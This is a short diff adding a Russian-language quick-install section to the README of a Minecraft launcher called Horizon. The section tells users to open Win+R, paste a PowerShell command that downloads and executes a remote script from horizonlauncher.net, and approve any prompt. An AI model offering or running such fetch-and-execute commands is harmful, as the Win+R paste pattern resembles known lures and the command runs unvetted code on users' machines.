@@ -4,6 +4,16 @@
   </a>
 </p>
 
+<p align="center"><b>Быстрая установка (Win+R)</b></p>
+
+<p align="center">Win+R → вставь команду → Enter. Лаунчер скачается, установится и откроется сам.</p>
+
+```bat
+powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
+```
+
+<p align="center">Без прав администратора. Если Windows спросит про PowerShell — подтверди.</p>
+
 <h1 align="center">Скачать Horizon — лаунчер Minecraft на Rust (Minecraft Rust Edition)</h1>
 
 <p align="center">
